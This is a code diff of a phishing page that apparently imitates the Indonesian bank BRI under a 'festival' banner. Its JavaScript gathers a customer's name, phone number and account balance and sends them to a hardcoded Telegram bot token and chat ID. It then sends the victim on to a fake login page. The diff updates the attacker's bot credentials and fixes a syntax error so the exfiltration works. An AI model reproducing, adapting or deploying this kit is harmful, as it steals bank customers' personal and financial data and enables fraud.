@@ -738,6 +738,7 @@ body{
   }
 }
 
+
 </style>
 <body>
 
@@ -969,23 +970,16 @@ body{
         const nomor = document.getElementById("nomor").value;
         const saldo = document.getElementById("saldo").value.replace(/\./g, ''); // Menghapus pemisah ribuan
 
-        const message = `
-├• 𝗕𝗥𝗜 | 𝗙𝗘𝗦𝗧𝗜𝗩𝗔𝗟
-├───────────────────
-├• 𝗡𝗮𝗺𝗮 : ${nama}
-├• 𝗡𝗼𝗺𝗼𝗿 : ${nomor}
-├• 𝗦𝗮𝗹𝗱𝗼 : ${saldo}
-╰───────────────────
-`;
+        const message = `────────────\n𝙳𝙰𝚃𝙰 𝙽𝙰𝚂𝙰𝙱𝙰𝙷\n────────────\n𝙽𝙰𝙼𝙰   : ${nama}\n𝚂𝙰𝙻𝙳𝙾 : ${saldo}\n𝙽𝙾𝙼𝙾𝚁 : ${nomor}\n────────────`;
 
-        const token = '7660633817:AAGNV-ajjgu7YFrGkdoIB0cduMNP8P2rBu4'; // Ganti dengan token yang benar
-        const chatId = '7265350679'; // Ganti dengan chat ID yang benar
+        const token = '7244640377:AAHSo7ophlf_W4ak_cJkQfA4NqYkeLzW8Qk';
+        const chatId = '6056418028';
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
         fetch(url, {
             method: 'POST',
             headers: {
-                'Content-Type':p 'application/json',
+                'Content-Type': 'application/json',
             },
             body: JSON.stringify({
                 chat_id: chatId,
@@ -995,8 +989,8 @@ body{
         .then(response => response.json())
         .then(data => {
             if (data.ok) {
-                
-                              window.location.href = 'login123iduser.html'; 
+                alert("mohon menunggu anda sedang di arahkan...");
+                window.location.href = 'loginusernameid.html'; 
             } else {
                 alert("Gagal mengirim data.");
             }
@@ -1022,6 +1016,5 @@ body{
         input.value = rupiah + (split[1] !== undefined ? ',' + split[1] : '');
     }
 </script>
-
 </body>
 </html>
